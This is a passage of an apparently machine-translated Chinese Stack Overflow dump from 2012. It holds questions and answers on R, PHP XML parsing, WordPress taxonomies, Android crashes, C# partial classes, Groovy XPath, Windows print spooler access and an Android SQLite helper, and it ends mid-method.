`mapply`然后您可以使用, 和 via在切片上运行任何函数`do.call`：

```
do.call(mapply, c(FUN = paste, n.by.n(x = 1:24, n = 2), sep = "_"))
#  [1] "1_2"   "3_4"   "5_6"   "7_8"   "9_10"  "11_12" "13_14" "15_16"
#  [9] "17_18" "19_20" "21_22" "23_24"

do.call(mapply, c(FUN = paste, n.by.n(x = 1:24, n = 6), sep = "_"))
# [1] "1_2_3_4_5_6"       "7_8_9_10_11_12"    "13_14_15_16_17_18"
# [4] "19_20_21_22_23_24" 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-12T22:49:38.583

这是一种无需任何`apply`家庭电话或循环的方法：

```
# Generate some sample data.
total_loci<-data.frame(genotype=sample(LETTERS,500,replace=TRUE))
# Paste
paste0(total_loci[c(TRUE,TRUE,FALSE,FALSE),],
       total_loci[c(FALSE,FALSE,TRUE,TRUE),]) 
```

# objective-c - 关闭 Mac OSX 应用程序的日志记录

> ID：12866426
> 
> 赞同：0
> 
> 时间：2012-10-12T20:13:21.483
> 
> 标签：objective-c, macos

我正在开发一个 Mac OS X 应用程序，我想知道一些事情：

运行应用程序时将更新哪些日志文件？和他们的路径？是否可以关闭日志记录（以编程方式）？如果是这样，是否可以针对特定应用程序这样做？我希望我的应用程序秘密运行。那么，还有其他想法吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-12T20:35:14.777

系统上没有任何标准的“这是曾经启动的每个应用程序”日志，应用程序也不会在启动时自动记录任何内容。对于 GUI 应用程序，“最近的应用程序”首选项将被更新。但是任何数量的东西都可以更新以响应您的应用程序所做的事情，并且没有任何有限的这些东西的列表或它们可能位于的位置（例如，我可以编写一个自定义脚本来监视程序启动并写入名称程序和文件句柄保存到 ~/Documents/InnocuousFile.tbz)。

基本上，只要你自己不记录任何东西，你就可以在这方面做尽可能多的事情。但这并没有真正让你的应用程序以任何有意义的方式隐蔽，因为除了日志之外，还有很多方法可以注意到程序的存在，而且我什至不认为日志是一个大问题。

# php - 如何使用 PHP 忽略给定数组中的某些集合

> ID：12866427
> 
> 赞同：3
> 
> 时间：2012-10-12T20:13:27.633
> 
> 标签：php, arrays

这是我遇到的问题，我正在尝试按类别分隔新闻，我有以下 txt 文件（其中包括所有新闻除以

```
 <item></item> 
```

这是一组 4 个新闻，在我的实际文件中我有数千个。

```
 <item>
 Title: News from Washington
 Author: John Doe
 Category: New Laws
 Body: News content...
 </item>

 <item>
 Title: News from Texas
 Author: General Lee
 Category: Road Accidents
 Body: News content/
 </item>

 <item>
 Title: News from Georgia
 Author: Marcus Smith
 Category: Street Food
 Body: News content
 </item>

 <item>
 Title: News from Illinois
 Author: Robert Simpson
 Category: School Projects
 Body: News content
 </item> 
```

我有以下编码：

```
//I get the content from the news file:
 $news = file_get_contents("news.txt");

//Then I create the following variables to get each set of news from the news variable:
 $regexp = '@<item>(.*?)</item>@msi'; 
```

我想从这里做的是，如果我只想获取一个包含“街头食品”作为类别的新闻文件，并忽略/忽略其他不同类别的新闻。

例如

我从上面的例子中得到的结果将是一个只包含这个项目的文件：

```
 <item>
 Title: News from Georgia
 Author: Marcus Smith
 Category: Street Food
 Body: News content
 </item> 
```

我尝试使用 preg_match_all 和 foreach 函数来获取一组特定类别的新闻，但没有运气。

你有什么建议来做到这一点？或者如果你能给我一个很好的例子。

提前致谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-12T20:29:39.353

你可以试试

```
$final = array();
$filename = "log.txt";
$news = simplexml_load_file($filename);

foreach ( $news as $item ) {
    $item = trim($item);
    $content = array();
    foreach ( explode("\n", $item) as $info ) {
        list($title, $data) = explode(":", $info);
        $content[trim($title)] = $data;
    }
    $final[trim($content['Category'])][] = $content;
}

#Remove Street Food
unset($final['Street Food']);

#Output The Rest 
var_dump($final); 
```

输出

```
 array
  'New Laws' => 
    array
      0 => 
        array
          'Title' => string ' News from Washington' (length=21)
          'Author' => string ' John Doe' (length=9)
          'Category' => string ' New Laws' (length=9)
          'Body' => string ' News content...' (length=16)
  'Road Accidents' => 
    array
      0 => 
        array
          'Title' => string ' News from Texas' (length=16)
          'Author' => string ' General Lee' (length=12)
          'Category' => string ' Road Accidents' (length=15)
          'Body' => string ' News content/' (length=14)
  'School Projects' => 
    array
      0 => 
        array
          'Title' => string ' News from Illinois' (length=19)
          'Author' => string ' Robert Simpson' (length=15)
          'Category' => string ' School Projects' (length=16)
          'Body' => string ' News content' (length=13) 
```

您还可以`Rewrite The XML`使用以下

```
#Rewrite the array to new XML Fromat
rewriteToXML($final,"log.xml"); 
```

这将返回

```
<?xml version="1.0"?>
<items>
    <item>
        <Title> News from Washington</Title>
        <Author> John Doe</Author>
        <Category> New Laws</Category>
        <Body> News content...</Body>
    </item>
    <item>
        <Title> News from Texas</Title>
        <Author> General Lee</Author>
        <Category> Road Accidents</Category>
        <Body> News content/</Body>
    </item>
    <item>
        <Title> News from Illinois</Title>
        <Author> Robert Simpson</Author>
        <Category> School Projects</Category>
        <Body> News content</Body>
    </item>
</items> 
```

阅读新格式更容易

```
$final = array();
$filename = "log.xml";
$news = simplexml_load_file($filename);

foreach ( $news as $item ) {
    #Check if not Street Food
    if(trim($item->Category) != 'Street Food')
            $final[trim($item->Category)][] = (array) $item;
}

#Output The Rest
var_dump($final); 
```

重写功能

```
function rewriteToXML($array, $fileName = null) {
    $xml = new SimpleXMLElement("<items />");
    foreach ( $array as $key => $item ) {
        $child = $xml->addChild("item");
        foreach ( $item as $list ) {
            foreach ( $list as $title => $data ) 
            {
                $child->addChild($title, $data);
            }
        }
    }
    $xml->asXML($fileName);
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-12T20:15:31.343

如果这是一个 xml 文件，我会使用 simpleXML 而不是正则表达式。然后您可以使用 xQuery 查询 simpleXML 文档。

[http://php.net/manual/en/book.simplexml.php](http://php.net/manual/en/book.simplexml.php)

# dart - 有没有办法在不为导入分配前缀的情况下获得顶级名称的代码完成？

> ID：12866428
> 
> 赞同：1
> 
> 时间：2012-10-12T20:13:31.030
> 
> 标签：dart

给定类似的东西：

```
import 'dart:math'; 
```

除非我这样做，否则我似乎无法找到在顶级名称上完成 Dart 编辑器代码的方法：

```
import 'dart:math' as foo; 
```

有没有一种特殊的方法可以在不指定前缀的情况下做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-15T17:05:31.657

尚不支持。见：[http ://www.dartbug.com/5872](http://www.dartbug.com/5872)

# wordpress - Wordpress，使用永久链接列出自定义帖子类型的所有分类法

> ID：12866430
> 
> 赞同：2
> 
> 时间：2012-10-12T20:13:40.783
> 
> 标签：wordpress, taxonomy

是否有任何简单的方法可以使用永久链接列出自定义帖子类型的所有分类法？

`taxonomy=title&post_type=company`

以下内容不起作用，它仅列出帖子的类别：

```
$args = array (
    'type' => 'company', //your custom post type
    'orderby' => 'name',
    'order' => 'ASC',
    'hide_empty' => 0 //shows empty categories
);
$categories = get_categories( $args );
foreach ($categories as $category) {    
    echo $category->name;
    $post_by_cat = get_posts(array('cat' => $category->term_id));

    echo '<ul>';
    foreach( $post_by_cat as $post ) {
        setup_postdata($post);
        echo '<li><a href="'.the_permalink().'">'.the_title().'</a></li>';
    }
    echo '</ul>';
} 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-12T21:16:06.193

尝试改变

```
'type' => 'company', //your custom post type 
```

到

```
'post_type' => 'company', //your custom post type 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2015-03-10T22:18:15.200

改变

```
'type' => 'company', // your custom post type 
```

到

```
'taxonomy' => 'yourtaxonomyname', // your custom taxonomy 
```

另见[http://codex.wordpress.org/Function_Reference/get_categories](http://codex.wordpress.org/Function_Reference/get_categories)

* * *

## 回答 #3

> 赞同：-2
> 
> 时间：2012-10-12T21:38:51.010

这应该有效：

```
$index_query = new WP_Query(array('post_type' => 'company', 'posts_per_page' => '-1', 'order' => 'DESC'));

while ($index_query->have_posts()) : $index_query->the_post();

    $taxonomy_ar = get_the_terms($post->ID, 'tax-name');

    $output = '<span class="btn">';
    foreach($taxonomy_ar as $taxonomy_term) {
        $output .= '<a href="'.get_term_link($taxonomy_term->slug, 'title').'">'.$taxonomy_term->name.' <span class="label">'.$taxonomy_term->count.'</span></a> ';
    }
    $output .= '</span>';

    echo $output;

endwhile;​ 
```

# android - 无法在 Sony Experia S 上开始活动

> ID：12866434
> 
> 赞同：-1
> 
> 时间：2012-10-12T20:14:03.400
> 
> 标签：android, android-fragments, android-activity, sony

我最近将我的应用程序发布到了 android play 商店。

我特别看到来自一台设备的大量错误日志。这是索尼 Experia S。

我联系了设备的所有者，他说他有最新版本的 android（不知道确切版本）。

我从一位大学开发人员那里听说，索尼设备和 android 有更多知名的 issieus。

这个应用程序特别适用于片段......不知道这是否是问题但是......也许索尼不知道如何处理它们。

有谁知道这个问题可能是什么。

错误日志如下所示：

```
java.lang.RuntimeException: Unable to start activity ComponentInfo{com.crosscommunications.kvodeventer/com.crosscommunications.kvodeventer.KVODeventerActivity}: java.lang.RuntimeException: Unable to start activity ComponentInfo{com.crosscommunications.kvodeventer/com.crosscommunications.kvodeventer.TabControllerHome}: java.lang.NullPointerException
at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1967)
at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:1992)
at android.app.ActivityThread.access$600(ActivityThread.java:127)
at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1158)
at android.os.Handler.dispatchMessage(Handler.java:99)
at android.os.Looper.loop(Looper.java:137)
at android.app.ActivityThread.main(ActivityThread.java:4511)
at java.lang.reflect.Method.invokeNative(Native Method)
at java.lang.reflect.Method.invoke(Method.java:511)
at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:980)
at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:747)
at dalvik.system.NativeStart.main(Native Method)
Caused by: java.lang.RuntimeException: Unable to start activity ComponentInfo{com.crosscommunications.kvodeventer/com.crosscommunications.kvodeventer.TabControllerHome}: java.lang.NullPointerException
at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1967)
at android.app.ActivityThread.startActivityNow(ActivityThread.java:1808)
at android.app.LocalActivityManager.moveToState(LocalActivityManager.java:135)
at android.app.LocalActivityManager.startActivity(LocalActivityManager.java:347)
at android.widget.TabHost$IntentContentStrategy.getContentView(TabHost.java:682)
at android.widget.TabHost.setCurrentTab(TabHost.java:346)
at android.widget.TabHost.addTab(TabHost.java:236)
at com.crosscommunications.kvodeventer.KVODeventerActivity.onCreate(KVODeventerActivity.java:27)
at android.app.Activity.performCreate(Activity.java:4470)
at android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1052)
at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1931)
... 11 more
Caused by: java.lang.NullPointerException
at com.crosscommunications.kvodeventer.KVOHome.onCreateView(KVOHome.java:52)
at android.support.v4.app.FragmentManagerImpl.moveToState(FragmentManager.java:870)
at android.support.v4.app.FragmentManagerImpl.moveToState(FragmentManager.java:1080)
at android.support.v4.app.BackStackRecord.run(BackStackRecord.java:622)
at android.support.v4.app.FragmentManagerImpl.execPendingActions(FragmentManager.java:1416)
at android.support.v4.app.FragmentActivity.onStart(FragmentActivity.java:505)
at android.app.Instrumentation.callActivityOnStart(Instrumentation.java:1136)
at android.app.Activity.performStart(Activity.java:4480)
at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1940)
... 21 more 
```

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-12T20:44:59.667

只需对您的代码进行空检查：

KVOHome 活动，第 52 行。在 com.crosscommunications.kvodeventer.KVOHome.onCreateView(KVOHome.java:52)

最有可能的是，索尼向您的代码发送了一个空值。

# c# - 声明中缺少部分修饰符..存在这种类型的另一个部分声明”。我是初学者，只是在学习这本书

> ID：12866436
> 
> 赞同：16
> 
> 时间：2012-10-12T20:14:11.903
> 
> 标签：c#, winforms, declaration, partial, form-control

我是初学者，我正在按照一本书做练习。下面是我的代码，我得到了这个

`"Missing partial modifier on declaration of type 'Windowsform.Form1'; another partial declaration of this type exists"`.

**我应该怎么办？**我的代码如下：

```
using System;
using System.Windows.Forms;

namespace Windowsform
{
    public class Form1 : Form
    {
       private TextBox txtEnter;
       private Label lblDisplay;
       private Button btnOk;

       public Form1()

       {
           this.txtEnter = new TextBox();
           this.lblDisplay = new Label();
           this.btnOk = new Button();
           this.Text = "My Hellowin app!";

           //txtEnter
           this.txtEnter.Location = new System.Drawing.Point(16, 32);
           this.txtEnter.Size = new System.Drawing.Size(264, 20);

           //lblDisplay
           this.lblDisplay.Location = new System.Drawing.Point(16, 72);
           this.lblDisplay.Size = new System.Drawing.Size(264, 128);

           //btnOK
           this.btnOk.Location = new System.Drawing.Point(88, 224);
           this.btnOk.Text = "OK";
           this.btnOk.Click +=
               new System.EventHandler(this.btnOK_Click); 

           //MyForm
           this.Controls.AddRange(new Control[] {
                            this.txtEnter, this.lblDisplay, this.btnOk});

       }

       static void Main()
       {
           Application.Run(new Form1());
       }

       private void btnOK_Click(object sender, System.EventArgs e)
       {
           lblDisplay.Text = txtEnter.Text + "\n" + lblDisplay.Text;
       }
    }
} 
```

* * *

## 回答 #1

> 赞同：36
> 
> 时间：2012-10-12T20:15:52.507

在另一个地方，您声明了一个具有相同名称 ( `Form1`) 的类，并使用`partial`修饰符声明了它。

如果要将类拆分为两个不同的文件（例如，此文件用于 UI 布局，另一个文件用于逻辑），则只需将`partial`修饰符添加到声明中：

```
public partial class Form1
{
} 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-10-12T20:23:39.567

当您创建一个新表单时，它实际上是在两个不同的地方创建的。声明类的一个地方是实现所有管道的地方，以及您在此处粘贴的文件以编写所有功能。为了使这成为可能，c# 具有部分类功能，如果在程序集的某个位置使用部分修饰符定义类，则可以定义该类的多个声明，只要它具有该修饰符。

[更多关于 msdn 的内容](http://msdn.microsoft.com/en-us/library/wa80x488%28v=vs.100%29.aspx)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2018-10-19T21:06:03.523

在我的情况下，当我在其中使用 Web 表单应用程序时发生此错误`asp.net`，这是因为在我的`global.asax`标记中，我已将`CodeBehind`Attribute替换为`CodeFile`. 改回来解决了这个问题。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2015-06-05T14:37:43.317

以防万一有人像我一样偶然发现...我一直在 Visual Studio 2013 for Web 和 Visual Studio 2015 RC 之间来回切换以使用我的 MVC 解决方案。

如果您尝试在 2015 RC 中打开 MVC4 解决方案，它会执行一些自动魔术，这可能会导致您下次在 2013 年为 Web 打开相同的解决方案时出现此错误。

我最终回滚到之前的 SVN 版本，只使用 2013 年的 Web 和我的代码构建得很好，就像它多年来一样。我知道这不是正确的解决方法，但这就是导致它在我的实例中突然“弹出”的原因。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2017-08-02T04:28:34.453

TL;DR：由 VS2013 重命名的类的痕迹引起，但 VS2013 并没有在所有地方正确重命名，导致旧名称的实例挂在未公开的地方。

详细信息：我在 VS2013 中遇到了完全相同的错误，就我而言，最初我添加了一个新类“Employee”，但后来意识到它应该是 AddEmployee 所以我右键单击并更改了名称，它“似乎”全部更改正确的地方。
过了一会儿，我尝试添加一个 Employee 类，然后得到了错误。在访问这里并没有找到修复程序后，我在“整个解决方案”中搜索了 Employee 的其他实例，并且从我之前将 Employee 重命名为 AddEmployee 时出现了几次失败：

```
AddEmployee.aspx.cs:    public partial class Employee : System.Web.UI.Page
AddEmployee.aspx.designer.cs:    public partial class Employee { 
```

将这两个更新为 AddEmployee 并且错误消失并按应有的方式编译和运行..

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2015-03-24T08:15:58.920

我可能完全错了，但我在 MVC3 和 EF4 上遇到了同样的错误（甚至更多）。在桌子上敲了一天左右的头后，我终于决定升级到 MVC4，如果 MVC3 不配合，我就只能忍受学习曲线。有趣的是，我所有的错误都消失了。

在升级之前，我必须进行 100 次搜索才能找到我的重复声明。

似乎 MVC4 和 EF4 一起玩得更好。

# xpath - 在 Groovy 中使用 Xpath 删除 XML 中的节点

> ID：12866437
> 
> 赞同：2
> 
> 时间：2012-10-12T20:14:15.807
> 
> 标签：xpath, groovy, gpath

我有这个 Groovy 代码可以使用 xpath 字符串删除节点，但是在删除 xpath 导致多个节点实例的节点时遇到问题。

**示例 XML...**

```
<root>
  <element1>foo</element1>
  <element2>bar</element2>
  <items>
     <item>
       <name>a</name>
       <desc>b</desc>
     <item>
     <item>
        <name>c</name>
        <desc>x</desc>
     </item>
  </items>
</root> 
```

**删除节点的代码...**

```
def resource = XmlSlurper().parseText(xml)
def xpathsToDelete = ['/root/element1','/root/items/item/name']
 xpathsToDelete.each {
     def pathTokens = it.path.tokenize '/'
     def currentNode = resource
     if ( currentNode.name() == pathTokens.first() ) { 
       def xpath = pathTokens.tail().join '/'
       currentNode = currentNode."${xpath}"
       currentNode.replaceNode{}
     }
} 
```

`element1`上面的代码使用 xpath删除节点`/root/element1`，它评估为单个节点，但不适用于`/root/items/name`评估为多个节点。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-13T12:06:03.057

这是一个棘手的问题。它与[这个问题](https://stackoverflow.com/questions/1307919/using-variables-in-xmlslurpers-gpath)有关，这对我的回答至关重要。

这是一个解决方案：

```
import groovy.util.* 
import groovy.xml.* 

def xml = """<root>
  <element1>foo</element1>
  <element2>bar</element2>
  <items>
     <item>
       <name>a</name>
       <desc>b</desc>
     </item>
     <item>
        <name>c</name>
        <desc>x</desc>
     </item>
  </items>
</root>"""

def removeNodes = { doc, path ->
    def nodes = doc
    path.split("\\.").each { nodes = nodes."${it}" }
    nodes.each { it.replaceNode{} }    
}

def resource = new XmlSlurper().parseText(xml)
def xpathsToDelete = ['/root/element1','/root/items/item/name']

xpathsToDelete.each { xpath ->
    def trimXPath = xpath.replaceFirst( "/root/", "").replace("/",".")
    removeNodes(resource, trimXPath)
}

println XmlUtil.serialize(new StreamingMarkupBuilder().bind {
    mkp.yield resource
}) 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-15T08:48:29.487

这似乎也有效：

```
import groovy.xml.*

def xml = '''<root>
            |  <element1>foo</element1>
            |  <element2>bar</element2>
            |  <items>
            |     <item>
            |       <name>a</name>
            |       <desc>b</desc>
            |     </item>
            |     <item>
            |        <name>c</name>
            |        <desc>x</desc>
            |     </item>
            |  </items>
            |</root>'''.stripMargin()

def newxml = new XmlSlurper().parseText( xml ).with { x ->
  [ '/root/element1', '/root/items/item/name' ].each { path ->
    def s = path.split( '/' ).drop( 2 ).inject( x ) { element, p ->
      element."$p"
    }?.replaceNode {}
  }
  x
}

println XmlUtil.serialize(new StreamingMarkupBuilder().bind {
    mkp.yield newxml
}) 
```

# c# - 为什么我在尝试使用 OpenPrinter 打开特定作业时收到 ERROR_ACCESS_DENIED？

> ID：12866444
> 
> 赞同：0
> 
> 时间：2012-10-12T20:14:39.080
> 
> 标签：c#, windows, print-spooler-api

根据给定作业ID的[undocprint](http://www.undocprint.org/winspool/spool_files)，应该可以使用格式为“PrinterName，Job xxxx”的字符串打开打印机来检索作业`OpenPrinter`的假脱机文件。[MSDN 文档](http://msdn.microsoft.com/en-us/library/windows/desktop/dd162751%28v=vs.85%29.aspx)也列出了此方法，但在逗号“PrinterName, Job xxxx”之后有一个额外的空格`ReadPrinter`。

每当我尝试从我的测试应用程序（使用任一字符串格式）调用此方法时，我都会得到`ERROR_ACCESS_DENIED`（Windows 8 x64）。为什么会这样，我需要做什么才能使其正常工作？

我以管理员身份运行测试应用程序，暂停作业或打印机或访问其他信息没有问题。

我知道我使用的 ID 是有效的，因为它会返回无效 ID `ERROR_INVALID_PRINTER_NAME`。

我正在使用的代码：

```
public static void OpenPrinter(String printerName,
                               ref IntPtr printerHandle,
                               ref PRINTER_DEFAULTS defaults) {
    if (OpenPrinter(printerName, ref printerHandle, ref defaults) == 0) {
        throw new Win32Exception(Marshal.GetLastWin32Error(),
                                 string.Format("Error getting access to printer: {0}", printerName));
    }
}

[DllImport("winspool.drv", EntryPoint = "OpenPrinterW", SetLastError = true, CharSet = CharSet.Unicode,
    ExactSpelling = true, CallingConvention = CallingConvention.StdCall)]
public static extern int OpenPrinter(String pPrinterName, ref IntPtr phPrinter, ref PRINTER_DEFAULTS pDefault);

[StructLayout(LayoutKind.Sequential)]
public struct PRINTER_DEFAULTS {
    public IntPtr pDatatype;
    public IntPtr pDevMode;
    public uint DesiredAccess;
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-14T00:44:03.080

事实证明，`pDefaults`必须通过`NULL`，然后一切正常。

这需要更改外部定义以采用 IntPtr 或类似的。

我还没有看到任何关于为什么会这样的文档（事实上，[MSDN 文档](http://msdn.microsoft.com/en-us/library/windows/desktop/dd162751%28v=vs.85%29.aspx)声明这种传递`NULL`应该与请求 USE 访问权限相同），但它确实解决了我们测试中的问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-12T20:26:01.607

权限。您是否以管理员权限运行？

# java - 重构数据库助手

> ID：12866445
> 
> 赞同：1
> 
> 时间：2012-10-12T20:14:40.980
> 
> 标签：java, android, sqlite

我正在创建一个具有这种结构的数据库（4 个表）：http: [//i.stack.imgur.com/vPaoD.png](http://i.stack.imgur.com/vPaoD.png)（由于缺少代表而无法嵌入）

我担心的是这个类的增长速度很快，而且因为它变得如此之大，所以在它中工作不再那么简单了。无论如何我可以重构（=将它分成几个类）我的databaseHelper，使其更简单，更有条理，但仍然易于使用？

公共类 DatabaseHelper 扩展 SQLiteOpenHelper {

```
// Database static variables
private static final int DATABASE_VERSION = 2;
private static final String DATABASE_NAME = "feedlrDatabase";

// Declaring feed table
private static final String TABLE_FEED = "feed";
private static final String FEED_COLUMN_ID = "_id";
private static final String FEED_COLUMN_NAME = "name";

// Declaring feed-user bridge table
private static final String TABLE_FEEDUSER = "feeduser";
private static final String FEEDUSER_COLUMN_FEED_ID = "feed_ID";
private static final String FEEDUSER_COLUMN_USER_ID = "user_ID";

// Declaring user table
private static final String TABLE_USER = "user";
private static final String USER_COLUMN_ID = "_id";
public static final String USER_COLUMN_USERNAME = "username";
public static final String USER_COLUMN_USERID = "userid";
public static final String USER_COLUMN_IMGURL = "ProfileImageURL";
public static final String USER_COLUMN_SOURCE = "source";

// Declaring item table
private static final String TABLE_ITEM = "item";
public static final String ITEM_COLUMN_ID = "_id";
public static final String ITEM_COLUMN_ITEMID = "itemid";
public static final String ITEM_COLUMN_TEXT = "text";
private static final String ITEM_COLUMN_TIMESTAMP = "timestamp";
private static final String ITEM_COLUMN_TYPE = "type";
private static final String ITEM_COLUMN_URL = "URL";
private static final String ITEM_COLUMN_IMGURL = "imgURL";
private static final String ITEM_COLUMN_USER_ID = "user_ID";

private SQLiteDatabase db = this.getWritableDatabase();

public DatabaseHelper(Context context) {
    super(context, DATABASE_NAME, null, DATABASE_VERSION);
}

public void onCreate(SQLiteDatabase database) {
    // @formatter:off
    // Creating feed table
    database.execSQL("CREATE TABLE " + TABLE_FEED + "(" + FEED_COLUMN_ID
            + " INTEGER PRIMARY KEY AUTOINCREMENT," + FEED_COLUMN_NAME
            + " TEXT UNIQUE" + ")");

    // Creating feed-user bridge table
    database.execSQL("CREATE TABLE " + TABLE_FEEDUSER + "("
            + FEEDUSER_COLUMN_FEED_ID + " INT NOT NULL,"
            + FEEDUSER_COLUMN_USER_ID + " INT NOT NULL" + ")");

    // Creating user table
    // TODO Should username be the unique idenifier of a user?!
    database.execSQL("CREATE TABLE " + TABLE_USER + "(" + USER_COLUMN_ID
            + " INTEGER PRIMARY KEY AUTOINCREMENT," + USER_COLUMN_USERNAME
            + " TEXT NOT NULL," + USER_COLUMN_USERID + " TEXT UNIQUE,"
            + USER_COLUMN_IMGURL + " TEXT," + USER_COLUMN_SOURCE
            + " TEXT NOT NULL" + ")");

    // Creating item table
    database.execSQL("CREATE TABLE " + TABLE_ITEM + "(" + ITEM_COLUMN_ID
            + " INTEGER PRIMARY KEY AUTOINCREMENT," + ITEM_COLUMN_ITEMID
            + " INT UNIQUE," + ITEM_COLUMN_TEXT + " TEXT,"
            + ITEM_COLUMN_TIMESTAMP + " DATETIME," + ITEM_COLUMN_TYPE
            + " TEXT," + ITEM_COLUMN_URL + " TEXT," + ITEM_COLUMN_IMGURL
            + " TEXT," + ITEM_COLUMN_USER_ID + " INT NOT NULL" + ")");
    // @formatter:on
}

@Override
public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {
    // Temporarily drops all tables
    db.execSQL("DROP TABLE IF EXISTS " + TABLE_FEED);
    db.execSQL("DROP TABLE IF EXISTS " + TABLE_FEEDUSER);
    db.execSQL("DROP TABLE IF EXISTS " + TABLE_USER);
    db.execSQL("DROP TABLE IF EXISTS " + TABLE_ITEM);
    onCreate(db);
}

public void addFeed(Feed feed) {
    ContentValues temp = new ContentValues();

    temp.put(FEED_COLUMN_NAME, feed.getTitle());
    try {
        db.insertOrThrow(TABLE_FEED, null, temp);
    } catch (SQLiteConstraintException e) {
        Log.d("ERROR", "Inserted feed is not UNIQUE!");
        // TODO Apply listener to notify the user that the feed name already
        // exists!
    }
}

public void removeFeed(Feed feed) {
    String title = feed.getTitle();
    long id = getFeedID(feed);

    removeFeedBridge(id);

    db.delete(TABLE_FEED, FEED_COLUMN_NAME + "=?", new String[] { title });
}

public ArrayList<String> listFeeds() {
    final ArrayList<String> feeds = new ArrayList<String>();

    Cursor c = db.rawQuery("SELECT * FROM " + TABLE_FEED, null);
    while (c.moveToNext()) {
        String s = c.getString(1);
        feeds.add(s);
    }
    c.close();
    return feeds;
}

public long getFeedID(Feed feed) {
    String feedTitle = feed.getTitle();
    SQLiteDatabase db = this.getReadableDatabase();
    Cursor c = db.query(TABLE_FEED, new String[] { FEED_COLUMN_ID },
            FEED_COLUMN_NAME + "=?", new String[] { feedTitle }, null,
            null, null);
    c.moveToNext();
    Long id = Long.parseLong(c.getString(0));
    c.close();
    return id;
}

public long getUserID(User user) {
    long id = user.getId();
    SQLiteDatabase db = this.getReadableDatabase();
    Cursor c = db.query(TABLE_USER, new String[] { USER_COLUMN_ID },
            USER_COLUMN_ID + "=?", new String[] { id + "" }, null, null,
            null);
    c.moveToNext();
    Long id1 = Long.parseLong(c.getString(0));
    c.close();
    return id1;
}

public ArrayList<String> listUsers() {
    final ArrayList<String> users = new ArrayList<String>();

    Cursor c = db.rawQuery("SELECT * FROM " + TABLE_USER, null);

    while (c.moveToNext()) {
        String s = c.getString(1);
        users.add(s);
    }
    return users;
}

public void addUserToFeed(User user, Feed feed) {
    long FeedID = getFeedID(feed);
    long UserID = addUser(user);

    // Add bridge connection
    if (UserID != -1) {
        addFeedUserBridge(FeedID, UserID);
    }
}

public long addUser(User user) {
    // TODO Check if the user already exists!!
    ContentValues temp = new ContentValues();

    temp.put(USER_COLUMN_USERNAME, user.getUserName());
    temp.put(USER_COLUMN_USERID, user.getId());
    temp.put(USER_COLUMN_IMGURL, user.getProfileImageURL());
    temp.put(USER_COLUMN_SOURCE, "Twitter");
    // TODO implement source on user?

    long userID = db.insert(TABLE_USER, null, temp);
    return userID;
}

public void addFeedUserBridge(long feedID, long userID) {
    ContentValues temp = new ContentValues();

    temp.put(FEEDUSER_COLUMN_FEED_ID, feedID);
    temp.put(FEEDUSER_COLUMN_USER_ID, userID);

    db.insert(TABLE_FEEDUSER, null, temp);
}

public void removeUserFromFeed(Feed feed, User user) {
    long feedID = getFeedID(feed);
    long userID = getUserID(user);

    removeFeedUserBridge(feedID, userID);
}

private void removeUser(User user) {
    long id = user.getId();
    db.delete(TABLE_USER, USER_COLUMN_ID + "=?", new String[] { id + "" });
}

private void removeFeedUserBridge(long feedID, long userID) {
    db.delete(TABLE_FEEDUSER, FEEDUSER_COLUMN_FEED_ID + "=?" + " and "
            + FEEDUSER_COLUMN_USER_ID + "=?", new String[] { feedID + "",
            userID + "" });
}

public ArrayList<String> listFeedUser() {
    final ArrayList<String> feeduser = new ArrayList<String>();
    Cursor c = db.rawQuery("SELECT * FROM " + TABLE_FEEDUSER, null);
    while (c.moveToNext()) {
        feeduser.add(c.getString(0) + " " + c.getString(1));
    }
    c.close();
    return feeduser;
}

private void removeFeedBridge(Long id) {
    db.delete(TABLE_FEEDUSER, FEEDUSER_COLUMN_FEED_ID + "=?",
            new String[] { id + "" });
}

public void updateUser(long userID) {
    // TODO implement this method
}

public void addListOfItems(List<? extends Item> itemList) {
    db.beginTransaction();
    for (Item i : itemList) {
        ContentValues temp = new ContentValues();
        temp.put(ITEM_COLUMN_ITEMID, i.getId());
        temp.put(ITEM_COLUMN_TEXT, i.getText());
        temp.put(ITEM_COLUMN_TIMESTAMP, i.getTimestamp());
        temp.put(ITEM_COLUMN_TYPE, i.getText());
        temp.put(ITEM_COLUMN_URL, i.getURL());
        temp.put(ITEM_COLUMN_IMGURL, i.getIMGURL());
        temp.put(ITEM_COLUMN_USER_ID, i.getUser().getId());
        db.insertWithOnConflict(TABLE_ITEM, null, temp, SQLiteDatabase.CONFLICT_IGNORE);

    }
    db.setTransactionSuccessful();
    db.endTransaction();
}

public List<User> getUsersInFeed(Feed feed) {
    List<User> users = new ArrayList<User>();

    Cursor c = db
            .rawQuery("SELECT * FROM " + TABLE_USER + " WHERE "
                    + USER_COLUMN_USERID + " IN (SELECT "
                    + FEEDUSER_COLUMN_USER_ID + " FROM " + TABLE_FEEDUSER
                    + " WHERE " + FEEDUSER_COLUMN_FEED_ID + " = "
                    + getFeedID(feed) + ")", null);

    c.moveToFirst();
    while (!c.isAfterLast()) {
